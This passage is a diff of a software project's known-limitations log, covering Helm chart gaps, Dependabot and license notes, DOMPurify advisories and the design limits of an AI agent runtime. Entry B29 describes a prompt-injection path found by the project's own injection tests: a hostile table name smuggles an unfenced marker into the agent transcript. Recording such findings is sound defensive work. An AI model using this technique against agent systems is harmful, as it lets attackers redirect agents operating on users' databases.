+`helm3 template` and a `helm3 pull` of the pushed OCI artifact were all verified equivalent by hand
+before the pins were raised. But "verified once by hand" is not a gate, and nothing would catch a
+future Helm 4 packaging change that a Helm 3 client rejects at install time.
+
+Done when `helm-index-check.yml` (which today only curls the index and compares sha256, running no
+Helm client at all) also runs a pinned Helm 3.16 `helm repo add` + `helm pull` + `helm install` of
+the published chart version against a kind cluster — or when an equivalent post-publish smoke lands
+elsewhere and this entry is deleted.
+
+---
+
+
+## Chart configuration surface
+
+These were found while reviewing #362, which added the Gateway API `HTTPRoute` template, and its
+follow-up #366. None is caused by those changes; all are gaps they made visible. They share one
+failure shape: configuration the chart accepts that produces an install which succeeds while the
+app stays unreachable.
+
+### N1. The chart cannot expose the app on OpenShift, where `Route` is the native way in
+
+`grep -rl 'route.openshift.io' charts/ operator/` returns nothing: the chart renders an `Ingress`
+(`templates/ingress.yaml`) and, since #362, a Gateway API `HTTPRoute` (`templates/route.yaml`), but
+never a `route.openshift.io/v1` `Route`. Meanwhile the chart carries an OpenShift security-context
+adaptation (`templates/_helpers.tpl`, `templates/deployment.yaml`) and the repository publishes an
+OpenShift operator to OperatorHub, so OpenShift is a first-class target everywhere except the one
+object that makes the app reachable there.
+
+The consequence is the same symptom #362 was opened to fix, one platform over: `helm install`
+succeeds, the pod runs, and the operator has to hand-write a `Route` outside the chart and keep it in
+sync across upgrades. An `Ingress` is *sometimes* served on OpenShift by the router's ingress
+translation, but that is a compatibility shim with its own annotation dialect, not the native path,
+and it does not cover re-encrypt or passthrough TLS.
+
+Note the naming collision this now carries: `route.*` in `values.yaml` means Gateway API as of #362,
+so an OpenShift `Route` cannot reuse that key. `openshiftRoute.*` is the obvious alternative, and
+whichever key is chosen should be stated in the chart README next to `ingress.*` and `route.*` so the
+three exposure paths read as siblings.
+
+Done when an OpenShift cluster can be served by the chart alone, with TLS termination selectable, and
+when the README says which of the three exposure mechanisms belongs to which platform.
+
+### N2. `AUTH_COOKIE_SECURE` is reachable in every distribution channel except the chart
+
+`grep -rl AUTH_COOKIE_SECURE charts/ operator/helm-charts/` returns nothing. The variable is read at
+`src/lib/auth.ts:90` and is the documented answer for a browser reaching the app over plain HTTP on a
+non-loopback host (`docs/OIDC.md`, `docs/DISTRIBUTION.md`), where auth cookies otherwise carry the
+`Secure` flag, the browser rejects them, and — in the words of the comment at `src/lib/auth.ts:117` —
+"login silently loops". The upstream report that produced that comment is getumbrel/umbrel-apps#5847.
+
+Every other `config.*` key in this class already has a first-class value (`storageProvider`,
+`llmProvider`, `oidcIssuer`, ...) rendered by `templates/configmap.yaml` under the established
+`{{- if .Values.config.X }}` pattern. A chart user has to reach for `extraEnv` instead, which means
+the one setting most likely to be needed on a LAN or home-server install is the one setting that is
+not discoverable from `values.yaml`.
+
+This is not hypothetical: plain-HTTP channels shipping without the override has already been
+diagnosed on three separate distribution channels.
+
+Done when `config.authCookieSecure` exists, renders through the configmap like its siblings, is
+documented in the chart README's values table, and leaves the app's own default in place when unset —
+the variable's semantics are three-state (`true` / `false` / unset lets the app decide), so a plain
+boolean value with a `false` default would silently change behaviour for existing installs.
+
+### N3. Subpath deployment is build-time only, which is why #369 is deferred rather than scheduled
+
+[#369](https://github.com/libredb/libredb-studio/issues/369) asks to serve Studio under a path
+prefix on a shared domain — `https://example.com/libredb` next to `https://example.com/grafana`.
+`next.config.ts` sets no `basePath` and no `assetPrefix`, so there is zero support today.
+
+The constraint, recorded so nobody rediscovers it: **Next.js `basePath` is baked at build, not read
+at runtime.** Asset URLs (`/_next/static/...`) are emitted into the HTML and JS at build time and
+there is no supported runtime override, so a `BASE_PATH` env var on the prebuilt
+`ghcr.io/libredb/libredb-studio` image cannot work — the feature has to be a build arg and a
+rebuilt image. A reverse-proxy `StripPrefix` is not a workaround either: the browser asks for
+`/libredb/`, the proxy strips it, the app answers with HTML referencing `/_next/static/...` at the
+root, and that follow-up request no longer matches the `/libredb` router rule. Grafana can do this
+at runtime because it is a Go server templating its own HTML; a statically built Next.js app is
+structurally different.
+
+The surface a build-time implementation touches: roughly 40 `fetch('/api/...')` call sites, roughly
+15 `router.push('/...')`, the cookie `path: "/"` in `src/lib/auth.ts` and
+`src/app/api/auth/oidc/login/route.ts`, OIDC redirect URIs, `src/proxy.ts` matcher, the Docker
+healthcheck `GET /api/db/health`, the chart's ingress and route paths, the npm library surface, the
+E2E suite and the docs of roughly 27 distribution channels. `next/link` and the app-router `router`
+prefix automatically; `fetch`, middleware redirects and cookie paths do not.
+
+Deferred rather than scheduled because the acquisition-relevant PaaS one-click listings hand out
+subdomains, not subpaths, so no shipped channel needs it. Related sharp edge, same silent-no-op
+class as #366: `charts/libredb-studio/values.yaml` already lets a user set
+`ingress.hosts[].paths[].path` to `/libredb`, the install succeeds, and the app is unreachable.
+
+Done when a `BASE_PATH` build arg produces an image reachable under a path prefix — assets, API
+calls, auth cookie and OIDC redirect included — verified against a real path-routing proxy, or when
+the chart refuses a non-root ingress path outright and this entry records that as the answer.
+
+---
+
 
 ## Security Phase 1 deferrals
 
@@ -396,10 +1040,9 @@ not.
 
 ### H2. A 429 should produce a Retry-After-aware toast
 
-`src/hooks/use-query-execution.ts:277` and `src/components/NL2SQLPanel.tsx:126` already read
-`.error` from any non-ok body, so a rate-limited request shows its message today. What they do not
-do is read the `Retry-After` header and tell the user how long to wait. Done when the toast names
-the wait.
+`src/hooks/use-query-execution.ts:267-269` already reads `.error` from any non-ok body, so a
+rate-limited request shows its message today. What it does not do is read the `Retry-After` header
+and tell the user how long to wait. Done when the toast names the wait.
 
 ### H3. Audit events do not record a user agent
 
@@ -631,16 +1274,30 @@ the operator image has a different lifecycle and a different consumer (OpenShift
 OperatorHub, which does its own scanning). Done when a certification requirement
 asks for one.
 
-### C5. Dependabot has alerts but no version-update configuration
+### C5. Dependabot raises version updates but cannot raise security ones
 
-The repository has Dependabot alerts and secret scanning enabled, but there is no
-`.github/dependabot.yml`, so nothing opens a pull request for a bump. The
-dependency gate therefore reports advisories that a human has to act on by hand.
-Adding version updates is cheap and the reason it was not done here is scope, not
-disagreement - it also interacts with the 100 percent coverage gate and the
-required checks in ways worth thinking about once (a bot pull request must pass
-the same six gates). Done when `dependabot.yml` lands with a grouping strategy
-that does not produce one pull request per transitive package.
+`.github/dependabot.yml` now groups weekly version updates across Bun, GitHub
+Actions and both Dockerfiles, which is what the original entry asked for. Bun is
+its own `package-ecosystem`, not part of `npm` - the config shipped in #375 said
+`npm`, whose updater cannot see `bun.lock`, so five bot pull requests bumped
+`package.json` alone and died on `--frozen-lockfile`. What Dependabot still
+cannot do is the other half: its Bun support covers **version updates
+only** - security updates are not implemented upstream for this ecosystem. So an
+advisory against a package Bun resolves still reaches nobody automatically; Trivy
+and `bun audit` remain the only things that see it, and acting on one is still a
+human step.
+
+That is also why several dependencies are deliberately excluded from the bot, each
+with its reason recorded in the config: database driver majors (mocked in tests, so
+a wire-behaviour change goes green - ioredis 6's RESP3 default is the live case),
+the exact-pinned agent runtime (a bump fails
+`tests/unit/agent-dependency-boundary.test.ts` by design), `@zumer/snapdom` (pinned
+for ER-diagram export fidelity), and the `oven/bun` base image (its version lives
+in two places - the Dockerfile tag and the workflows' `bun-version` input - that
+Dependabot cannot see as one, so it must move by hand in both).
+
+Done when Bun security updates land upstream and the exclusion list can be
+re-read against whatever they cover.
 
 ### C6. `bun audit` cannot answer "is there a fix"
 
@@ -665,6 +1322,126 @@ behind it. Done when the bundled runtime's version and provenance appear in the
 SBOM or a sibling document - a second Trivy pass over the `fetch-node.sh`
 scripts' pinned version, or a hand-maintained component entry, whichever ships
 without adding a new failure mode to the release chain.
+
+### C8. No artefact root declares that part of the distribution is not MIT
+
+`LICENSE` states the project's own MIT terms and nothing at the root of any
+packaged artefact says that not everything inside them is under those terms. Two
+kinds of obligation sit behind that.
+
+The routine kind is attribution: a scan of the installed tree (1169 distinct
+packages) puts 1136 under MIT, Apache-2.0, ISC or BSD, all of which want the
+copyright notice to travel with redistributed copies, and two carry attribution as
+their whole purpose - `caniuse-lite` is CC-BY-4.0 and the `geist` font is under
+the SIL Open Font License.
+
+The specific kind is `seed-assets/sqlite/employee.db`, which is CC BY-SA 3.0 and
+therefore genuinely share-alike, not merely attribution-required. That was handled
+deliberately - `seed-assets/sqlite/ATTRIBUTION.md` records the provenance, the
+license, the modifications made here and the fact that the file is redistributed
+under the same terms - but the file ships in the image (the runner stage copies
+`seed-assets` explicitly) and in the packaged tarballs, and nothing at the root of
+those artefacts points at that nested ATTRIBUTION.md. A reader of the image sees
+an MIT `LICENSE` and a CC BY-SA database with no note connecting them.
+
+Done when a generated `NOTICE` (or `THIRD_PARTY_LICENSES`) ships at the root of
+the image and the tarballs, names the sample database's separate terms explicitly,
+and is regenerated from the lockfile rather than hand-maintained.
+
+### C9. `elkjs` is EPL-2.0 and a direct production dependency
+
+Every other direct production dependency is permissive. `elkjs@0.11.1` is
+EPL-2.0, a file-level reciprocal license with a patent-retaliation clause, and it
+is ours by choice rather than pulled in transitively: the schema diagram's layout
+worker imports it at `src/components/schema-diagram/elk.worker.ts`. It is used
+unmodified, which is the case EPL-2.0 is comfortable with, so nothing is wrong
+today - but it means the distributed bundle is MIT-plus-EPL rather than MIT, and
+that is a question an acquirer's counsel asks rather than one they overlook.
+
+Recorded rather than acted on because the alternatives are worse: ELK is the only
+layout engine in the ecosystem that produces the layered orthogonal routing the
+ER diagram depends on. Done when either the mixed terms are stated openly
+(alongside C8, which is the natural place) or a permissive layout engine proves it
+can match the output.
+
+### C10. The last DOMPurify advisories are held open by Monaco's pin
+
+`dompurify` via `monaco-editor` is the only advisory chain that reaches a user.
+Everything else `bun audit` reports - `minimatch`, `brace-expansion`, `flatted`,
+`picomatch`, `esbuild`, `@babel/core`, `undici` - arrives through `eslint`,
+`typescript-eslint`, `knip`, `tsup`, `workflow` and `@ai-sdk/*`, and none of it is
+in the image. `undici` was checked specifically, because the agent runtime sits in
+`devDependencies` by design yet reaches the standalone build: building with
+`DOCKER_BUILD=true` shows no `undici` anywhere under `.next/standalone`, since
+`@ai-sdk/provider-utils` reaches it through a `createRequire` call that output
+tracing cannot follow.
+
+#374 moved the shipped copy from 3.2.7 to 3.4.8 by upgrading Monaco itself, which
+cleared 14 of the 17. **Three or four remain** (FOSSA counts three, GitHub
+Advanced Security four - one advisory postdates FOSSA's scan) and none can be
+closed here: they need 3.4.9, 3.4.11, 3.4.12 and 3.4.13, Monaco pins dompurify
+exactly, and 0.56.0 is its newest release.
+
+**Do not "fix" these with a `package.json` override.** Monaco ships DOMPurify
+inlined in its prebuilt `min/vs` bundle and nothing in `src/` imports the package,
+so an override would change a lockfile entry no shipped code reads, leave the
+bundle byte-identical, and turn `bun audit`, FOSSA and Trivy green at once. The
+GHAS findings land on `bun.lock:<line>`, which is the tell: every one of those
+tools reads the manifest, not the artefact.
+
+Two related non-findings, recorded so they are not re-derived: `dompurify` is
+dual-licensed (MPL-2.0 OR Apache-2.0), so the copyleft half can simply not be
+chosen; and the LGPL-3.0 `@img/sharp-libvips-*` binaries never reach the runtime
+image, because the runner stage copies `node_modules` selectively and nothing in
+`src/` uses `next/image`.
+
+Consequence for the README: FOSSA publishes a second badge
+(`?type=shield&issueType=security`) alongside the license one already there, and
+it is red for exactly these advisories. Adding it was declined on 2026-08-15 -
+it would advertise a standing failure caused by an upstream pin rather than by
+anything neglected here. Add it when it goes green.
+
+Done when Monaco ships a dompurify at or past 3.4.13. Re-check on each Monaco
+release; verify by grepping the staged bundle for the version literal
+(`grep -o '"3\.4\.[0-9]*"' public/monaco/vs/editor-*.js`) rather than trusting the
+lockfile.
+
+### C11. The FOSSA integration reports three permanent failures
+
+FOSSA was connected in August 2026 and posts three commit statuses -
+`License Compliance`, `Security Analysis`, `Dependency Quality`. Under its default
+`Standard Bundle Distribution` policy all three fail, and they fail on every
+commit rather than on a regression, because they describe the standing dependency
+tree. They are commit statuses rather than check runs, so they carry no log to
+click through, and they are not in `main`'s required-check list, so they do not
+block a merge.
+
+The exported license issues (19) are almost entirely artefacts of how they are
+counted. Fourteen are the same LGPL-3.0 `@img/sharp-libvips-*` package counted
+once per platform binary, none of which ships (see C10). Two are file-level
+detections inside the `next` bundle (MPL-2.0 and a denied CC-BY-SA-4.0) against a
+package that is itself MIT. One is `highlight.js` CC-BY-SA-4.0 at depth 4 behind
+`@arethetypeswrong/cli`, a devDependency. One is the project itself at depth 0,
+denied for CC-BY-SA-3.0, which is the deliberately-vendored sample database in C8.
+That leaves `elkjs` EPL-2.0 - C9, and the only entry that is both real and ours.
+
+The cost of leaving it is that a permanently-red status trains everyone, including
+outside contributors, to read red as normal; #362 is the case where a genuine
+red mattered and was noticed only because nothing else was red.
+
+**Largely resolved on 2026-08-15.** The owner worked the FOSSA dashboard: the
+license findings above were ignored with their reasons, and `License Compliance`
+and `Dependency Quality` now pass. `Security Analysis` still reports three, which
+is the honest number - they are the Monaco-pinned DOMPurify advisories in C10, and
+this is now a status that means something rather than one that is always red.
+
+What remains is the cause rather than the symptom. FOSSA reads `bun.lock` but does
+not apply the manifest's dev/production split, so every devDependency is scanned as
+if it shipped - that is why `highlight.js`, four devDependency-only chains and the
+platform binaries appeared at all. Each new devDependency can therefore raise a
+finding that has to be ignored by hand. Done when that is reported upstream and
+fixed, or when the policy is scoped to production dependencies so the ignore list
+stops growing.
 
 ---
 
@@ -874,8 +1651,8 @@ the agent at all: the registry is keyed on `LLMProviderType`, the settings surfa
 (`src/lib/llm/types.ts`), and that union is what `LLM_PROVIDER` resolves against
 (`src/lib/llm/utils/config.ts`). Adding `anthropic` there makes `LLM_PROVIDER=anthropic` a
 selectable setting for the whole application, and `src/lib/llm/factory.ts` would then have to build a
-chat provider for it or throw - so the AI Assistant and the Natural Language Query panel would be
-broken for exactly the users who configured it.
+chat provider for it or throw - so every surface that resolves a provider through the factory would
+be broken for exactly the users who configured it.
 
 Serving it properly therefore means a `src/lib/llm/providers/anthropic.ts` that speaks Anthropic's
 Messages streaming protocol: `createSSEParser`'s `extractContent` in
@@ -990,20 +1767,39 @@ consequences follow that a single-writer run never meets and a second writer wou
   *per run* — the milestone's "no tool execution performed twice" criterion is about a restart, where
   the dead process is gone by construction, and that case is genuinely covered.
 
-Not defended in code because every available defence is worse than the constraint: a lock file is
-single-instance only (which the Postgres backend exists to escape), and a lease in the ledger is a
-distributed-lock design with its own expiry semantics. The honest boundary is that single ownership of
-a running workflow belongs to the layer above rather than being re-implemented below it — and how
-strong that guarantee is depends on which backend is configured, which is the part worth stating
-plainly. On the zero-config local world it holds by construction: the queue awaits each delivery
-before attempting the next, so retries are sequential. On the opt-in Postgres backend a
+Not defended at the storage layer because every available cross-process defence is worse than the
+constraint: a lock file is single-instance only (which the Postgres backend exists to escape), and a
+lease in the ledger is a distributed-lock design with its own expiry semantics. The honest boundary is
+that single ownership of a running workflow belongs to the layer above rather than being re-implemented
+below it — and how strong that guarantee is depends on which backend is configured, which is the part
+worth stating plainly. On the zero-config local world it holds by construction: the queue awaits each
+delivery before attempting the next, so retries are sequential. On the opt-in Postgres backend a
 visibility-timeout redelivery can overlap a handler that is still alive, and that is precisely where
 the second bullet above would bite.
+
+Both of those readings describe a queue that delivers agent drives, and **nothing delivers one today**
+— which is B9, and the two entries have to be read together because B5's severity is a function of
+B9's state. `mintAgentDriveToken` has no production caller, there is no `"use workflow"` function and
+no queue producer, so a run is driven exactly once, in the process that opened it
+(`src/app/api/agent/runs/route.ts`). A second drive of one run is therefore not reachable through the
+product on EITHER backend right now: producing one takes a caller that mints its own drive credential
+from `JWT_SECRET`, which is how the fence below was exercised against a live run rather than only in
+a test. Closing B9 is what makes this live, and in that order — a producer without the fence is a
+redelivery that runs the user's statement a second time.
+
+The process-local half of the fence now exists (2026-08): `AgentRunService.claimDrive`/`releaseDrive`
+(`src/lib/agent/run-service.ts`) refuse a second concurrent drive of one run inside a single process,
+and `AgentRunStore.append` refuses an append once the run's stream has been closed
+(`RUN_ALREADY_CLOSED`), turning the silent-loss mode of the second consequence into a loud refusal.
+What remains open is the cross-process half: two replicas driving one run would still both pass the
+read-then-append check, because the durable backend offers no compare-and-append.
 
 Done when either the run ledger can append conditionally on the stream's tail index (which is what
 would make both races impossible at the storage layer), or the single-ownership guarantee the runtime
 provides is asserted by a test rather than assumed by prose — whichever the durable backend can
-actually support.
+actually support. The process-local claim is asserted in
+`tests/unit/lib/agent/run-service.test.ts`, and the append-after-close guard in
+`tests/unit/lib/agent/run-store.test.ts`.
 
 ### B6. Every agent cost ceiling is per-drive, so N resumes cost up to N times one drive's budget
 
@@ -1012,10 +1808,10 @@ The three things that bound what a run may spend — `ExecutionBudgetTracker` (`
 drives a run and live only in its memory. `runInvestigation` (`src/lib/agent/investigation.ts`) takes
 them as injected resources, so a run resumed after a process death is handed a fresh set and starts
 each ceiling again. A run that dies and resumes ten times may therefore perform ten times
-`maxStatementsPerRun` statements and spend ten times `AGENT_RUN_DEADLINE_MS` of wall clock, even though
-each individual drive stayed honestly inside its bounds.
+`maxStatementsPerRun` statements and spend ten times its workflow's `runDeadlineMs` of wall clock, even
+though each individual drive stayed honestly inside its bounds.
 
-Nothing currently claims otherwise — `AGENT_MAX_MODEL_TURNS`'s docblock in
+Nothing currently claims otherwise — `AGENT_WORKFLOW_BUDGETS`'s docblock in
 `src/lib/agent/execution-policy.ts` states the per-drive scope explicitly rather than implying a
 per-run one, which is why this is a recorded limitation and not a defect. It matters for two later
 tasks: T10b's budget meter must not present a per-drive figure as a run total, and any retry policy
@@ -1100,6 +1896,13 @@ so an unconfigured model no longer leaves a run at `queued` forever. This entry 
 process is GONE — nothing threw, nothing can record, and the run stays `running` until something asks
 for it. Recording a failure cannot close that; only a producer can.
 
+Order matters against B5, which is why each entry now names the other: the producer this asks for is
+also what first makes a SECOND drive of one run possible, and a redelivery landing on a drive that is
+still running is a second execution against the user's database. B5's process-local fence
+(`claimDrive`/`releaseDrive`) is already in place, so the single-replica case is covered before the
+producer arrives; the cross-process case is not, and a producer plus more than one replica is the
+combination B5 still has no answer for.
+
 Adopting the SDK's Next.js integration is what would supply the producer, and it was refused
 deliberately rather than overlooked. Its documented setup asks for `/.well-known/workflow/*` to be
 excluded from the proxy matcher (`node_modules/workflow/docs/getting-started/next.mdx`), and it warns
@@ -1129,8 +1932,8 @@ while that happens, and B6's per-drive cost ceilings are accounted for across th
 
 Opened by #329 T10b. The task's bar names tokens among the figures the meter should report, and the
 meter deliberately does not show one: nothing in this repository bounds an agent run's token spend.
-`AGENT_EXECUTION_POLICY`'s budgets are statement-shaped (`src/lib/agent/execution-policy.ts`),
-`AGENT_MAX_MODEL_TURNS` bounds model TURNS rather than their size, and the run loop never reads the
+`AGENT_WORKFLOW_BUDGETS`'s budgets are statement-shaped (`src/lib/agent/execution-policy.ts`), its
+`maxModelTurns` bounds model TURNS rather than their size, and the run loop never reads the
 SDK's `usage` at all (`src/lib/agent/investigation.ts` consumes `fullStream` parts and the assistant
 messages, nothing else). A token figure would therefore be a number the server does not enforce,
 shown next to four that it does — which is the one thing that bar forbids, so the meter states the
@@ -1206,23 +2009,6 @@ finished run would report zero — which is why the ledger fold was chosen and i
 than papered over. Done when a run that has captured its schema shows the catalog reads it paid for,
 with a test that fails on the current under-count.
 
-### B14. An agent artifact hydrates the grid and the explain view, but not the chart or export surfaces
-
-Deferred by #329 T11, which is the task's own recorded narrowing rather than something discovered
-afterwards. A hydrated artifact reaches the two surfaces its operations produce — the results grid for
-`sql.query.read`, the explain view for `sql.explain.estimate` — and the charts, pivot and dashboard
-views keep rendering the tab's own result while one is shown. Charting a run's rows is a real want and
-a bigger change than it looks: `DataCharts` and `PivotTable` are configured against the columns of the
-result they were opened on, so hydrating them means deciding what happens to a chart configuration
-when the underlying result is replaced and then taken away again.
-
-Export is absent for a different reason, and it is a gap rather than a decision that closes anything:
-`exportResults` in `src/components/Studio.tsx` serializes `currentTab.result`, so offering the Export
-menu over a hydrated view would export the tab's rows while the user is looking at the run's. The
-menu is therefore hidden while an artifact is shown. Done when either surface can take an explicitly
-hydrated result — with the provenance badge still naming the run, since an exported file that came
-from an agent run and is indistinguishable from one the user ran is the thing to avoid.
-
 ### B15. A run's stored results are gone once the run ends, so a report's citations can outlive its rows
 
 Surfaced by #329 T11 rather than introduced by it: `ExecutionArtifactStore` holds results in process
@@ -1270,41 +2056,6 @@ modules that tracing cannot see. Done when the Postgres world is present in both
 asserting it (`tests/unit/packaging-payload-prune.test.ts` pins what the payload must keep and is the
 nearest existing home for such an assertion), and when `docs/AGENT.md`'s deployment section loses the
 caveat that points here.
-
-### B17. Table profiling and monitoring tools are deferred, so the agent's tool set is four
-
-Recorded as #329's own narrowing (planning decision P1), not as something discovered later. The
-canonical operation set is exactly three descriptors (`src/lib/db/operations/descriptors.ts`), and the
-parent epic pinned that number as a product decision, so a tool has to fit one of them or it does not
-exist. The M2 tool set is therefore schema inspection, a bounded read, an estimating plan inspection
-and report composition.
-
-The two that were left out sit on opposite sides of that line. **Table profiling** (row counts, null
-ratios, cardinality, value distributions) fits: it is a bounded read whose SQL the server composes
-per dialect, exactly like the catalog read. What it multiplies is scope — each statistic is a
-dialect-specific composition with its own cost, and a profile that silently scans a large table is
-its own hazard. **Monitoring** does not fit at all: it reaches `getMetrics`, slow-query listings and
-session listings, which are provider methods no descriptor covers, so wiring it would be a database
-reach outside `src/lib/db/operations/` — a defect by this milestone's constraint rather than a
-shortcut.
-
-Done, for profiling, when the composed statements exist per dialect with their own cost bound and the
-tool is added to the read-class set. Done, for monitoring, only after a decision about whether the
-operation set grows a fourth descriptor for non-SQL metadata reads — which drags the verification
-marker, the provider triad and the security matrix with it, and is a human product call.
-
-### B19. The agent endpoints are absent from docs/API_DOCS.md
-
-`docs/API_DOCS.md` documents every other route family (auth, database, AI, storage, connections,
-admin) request-by-request, and contains no mention of `/api/agent/*`. The behaviour document
-`docs/AGENT.md` describes the six paths and what each one refuses, which is why this is a
-completeness gap rather than an undocumented surface, but a reader who goes to the API reference for
-the request and response shapes will not find them and has no pointer telling them where to look.
-
-Nothing enforces that file's route list — no test compares it against `src/app/api/` — so the omission
-is invisible to the gates. Done when the agent family is documented there in the same shape as the
-others (or reduced to a pointer at `docs/AGENT.md` in the same place a reader looks), and ideally when
-a test derives the documented families from the route tree so the next family cannot be forgotten.
 
 ### B20. A Gemini deployment behind a proxy is not configurable, on either surface
 
@@ -1365,28 +2116,923 @@ a fingerprint sent with the request and compared server-side, refusing with a di
 has moved — rather than the client's snapshot being the only check. Until then `docs/AGENT.md` says
 the comparison is against the last fetch, not against the live descriptor.
 
-### B24. A run that answers nothing is still `succeeded`, and the vocabulary to say otherwise belongs to M3
+### B24. RESOLVED 2026-08-13 — the verdict is a field beside the status, not a fourth status word
 
-`AgentRunTerminalStatus` is `succeeded | failed | cancelled`. Nothing in it can say "this run
-finished, and did not answer". So an agent run that inspects the schema, executes its reads and then
-stops without calling `compose_report` ends `succeeded` — which is what nine live runs on 2026-08-12
-did, none of them producing a report.
+`AgentRunTerminalStatus` is unchanged: `succeeded | failed | cancelled`. What was added is
+`goalVerdict` on the `run-finished` event — additive and optional, exactly as `reason` and
+`stopReason` were before it.
 
-The user-facing half of this is closed. A run now records its `stopReason` and its closing prose, so
-the rail states plainly that "the model stopped without composing a cited report" and shows what the
-model actually said. What remains is the status word, and deliberately so:
+The deciding evidence was two live runs on 2026-08-13. One ended `succeeded` because the model
+stopped talking; one ended `failed` because it hit the turn ceiling; **both answered nothing**. A
+third shape exists and matters: a drive that dies before the loop ends `failed` with no verdict
+meaningful at all, because the run never got to try. Status and verdict are therefore independent
+axes, and one word cannot carry both.
 
-- **`failed` would be wrong for planning mode.** That mode has no tools and can never produce
-  evidence; a planning run that returned a good plan did exactly what the mode is for.
-- **Changing ledger semantics twice is the expensive kind of change.** Every past run is re-read
-  under the new meaning, so it is worth doing once, with the right vocabulary.
-- **The rule is not knowable yet.** M3 asks for goal verifiers *per template*, which implies the
-  answer differs by workflow type rather than being one predicate over every run.
+`needs_input` was rejected as the term. It names a capability this runtime does not have: a terminal
+run accepts no further ledger entries, nothing enqueues a drive (B9), and there is no
+resume-with-input path — so the word would promise a continuation nobody can offer. The rail says
+"Run answered" or "Run did not answer", and names the shortfall.
 
-This is a hand-off, not a deferral: **#330 already owns it.** Its acceptance criteria name
-`needs_input` — a status this codebase does not have — and its policy unit gates require "citation
-present for every final finding". The verifier that decides whether a run answered is M3's work, and
-the vocabulary extension arrives with it.
+Adding a fourth status would also have split `succeeded` by ledger generation, with nothing in an
+older record to say which meaning applied. The optional field has the opposite property: its absence
+means precisely what is true of it — no verifier ran — which
+`tests/unit/lib/agent/ledger-compatibility.test.ts` asserts against a real pre-change ledger.
 
-Done when a run that ends without a cited report says so in its STATUS as well as its timeline,
-under whatever term M3 ratifies, and every earlier ending still folds to the same meaning it had.
+The original reasoning, kept because it is what the decision was measured against: the concern was
+that changing ledger semantics twice is the expensive kind of change, that `failed` would be wrong
+for planning mode, and that the rule was not knowable until goal verifiers existed per template. All
+three held, and all three are why the answer is a field rather than a word.
+
+### B25. SQLite hides constraint-created indexes, so `fk_unindexed` can fire on a covered key
+
+`composeSqliteIndexes` reads the index inventory from `CREATE INDEX` text (`sql IS NOT NULL`), and
+the indexes SQLite creates for a `UNIQUE` or `PRIMARY KEY` constraint carry no DDL at all. They are
+therefore absent from the captured inventory, and a foreign-key column covered by a `UNIQUE`
+constraint looks uncovered to `findUnindexedForeignKeys` (`src/lib/agent/table-profile.ts`).
+
+The finding is worded to survive this — "no index **in the captured inventory** leads on this
+foreign-key column", not "this foreign key is unindexed" — and the primary key is read from the
+column inventory rather than the index one, so a PK-covered key is already correct. What remains
+wrong is the `UNIQUE` case, which reports a covering index that exists.
+
+Done when the SQLite capture surfaces constraint-created indexes — the information is in the table's
+own stored DDL, which `parseSqliteTableDdl` already reads for columns and foreign keys and could read
+for `UNIQUE` clauses too — or when the finding is suppressed on SQLite for columns a `UNIQUE`
+constraint covers. Related: B7 (PostgreSQL expression indexes are absent) and B8 (a composite foreign
+key comes back as the cross product of its sides, which is why composite keys are skipped entirely).
+
+### B26. A profile can test for an email shape and not for a digit run
+
+`table-profile.ts` tests one value shape inside the database, `LIKE '%_@_%._%'`, and derives
+`suspected_pii` from the ratio of matches. A run of digits — a phone number, a national id, a card
+number — is the other shape worth suspecting, and `LIKE` cannot express it: `_` means "any
+character", so a length test would match almost any text. PostgreSQL spells it `~ '[0-9]{9}'` and
+SQLite spells it `GLOB '*[0-9][0-9][0-9]…*'`.
+
+An earlier draft of this module shipped `LIKE '%_________%'` as a "nine digits" test, which would
+have produced a `suspected_pii` finding for essentially every text column. It was removed before it
+landed rather than approximated.
+
+Done when the shape tests are per-dialect predicates rather than one shared `LIKE`, with the digit
+run among them and each verified against that engine's own grammar.
+
+### B28. A profile that times out reports nothing rather than falling back to catalog statistics
+
+#330 T3 asks for "a timeout fallback to catalog stats". A profile that exceeds
+`statementTimeoutMs` currently surfaces as a repairable database error, so the model may narrow the
+profile or move on — but nothing reads `pg_stats` / `sqlite_stat1` for the approximate answer the
+engine already holds.
+
+The gap is honest rather than silent (the run is told the statement failed), and the fallback is a
+second composition path per dialect whose numbers are estimates the planner maintains, so a profile
+built from it would have to say which of its figures were measured and which were the engine's own
+estimate. Done when that distinction is carried in `AgentTableProfile` and the fallback is composed
+per dialect.
+
+### B29. An attacker-supplied identifier the model quotes back reaches a transcript unfenced
+
+Found by the injection fixtures in `tests/evals/injection.test.ts` (#330 T4), which is what those
+fixtures are for.
+
+Every block the SERVER writes is fenced and its markers neutralised, and the suite asserts that
+property directly by counting: a transcript holds exactly as many closing markers as the server
+opened. The path this does not cover is the model's own message. An attacker who can name a table can
+put the closing marker in that name; the model reads it correctly fenced, and then copies the
+identifier into its own tool ARGUMENTS — which are the model's words, not the server's. The
+transcript sent back on the next turn therefore carries an unfenced marker.
+
+**This is an open injection path, not a bounded residual**, and the first version of this entry said
+otherwise — the correction is worth recording because the mistake was instructive. It claimed "the
+text following the marker is the model's own JSON, not attacker content". That is false: an attacker
+who can name a table controls the WHOLE identifier, so they control the marker and arbitrary text
+after it, and JSON quoting around the string does not make that suffix the model's.
+
+What is true is a narrower and different claim, and it is what makes this hard to reach today rather
+than harmless: **the server never hands the model the raw marker.** Every server-authored path
+neutralises it first, so a model reading a hostile inventory sees the defanged spelling. For the raw
+marker to appear in an assistant message the model has to reconstruct it. The fixtures assert both
+halves — that the fenced inventory contains no raw marker, and that the transport does not prevent
+one if the model produces it anyway (the scripted model supplies it directly, which is stronger than
+what the fenced paths currently give a real one).
+
+The server's own blocks do stay balanced, which bounds what can be re-attributed to the SERVER — and
+nothing more than that.
+
+Fixing it means rewriting the messages the provider itself returned (`response.messages`), which is
+the transcript that provider will accept back — the same reason `investigation.ts` filters those
+messages to the assistant turn rather than rebuilding them. Done when a tool call's arguments are
+neutralised on the way into the transcript without desynchronising the `tool_call_id` pairing the
+endpoint validates.
+
+### B30. A green ledger probe does not promise the world will build: `version.txt` is checked later
+
+Found while reviewing #331 T5, by reading what the probe actually mirrors.
+
+`GET /api/agent/config` decides the rail's visibility partly on a writable-path probe, and that probe
+runs `@workflow/world-local`'s `ensureDataDir` steps: create the directory, check it is readable,
+write a probe file, remove it. The world does not call `ensureDataDir`. It calls `initDataDir`, which
+calls `ensureDataDir` **and then** reads `version.txt` from an existing ledger and parses it — first
+`parseVersionFile`, which throws on content with no `@`, then `parseVersion`, which throws on anything
+that is not `major.minor.patch`. Neither is reached by the probe.
+
+So an existing ledger directory whose `version.txt` is truncated, present-but-empty, or written by an
+incompatible release answers **green** — the directory is writable, which is all the probe asked. The
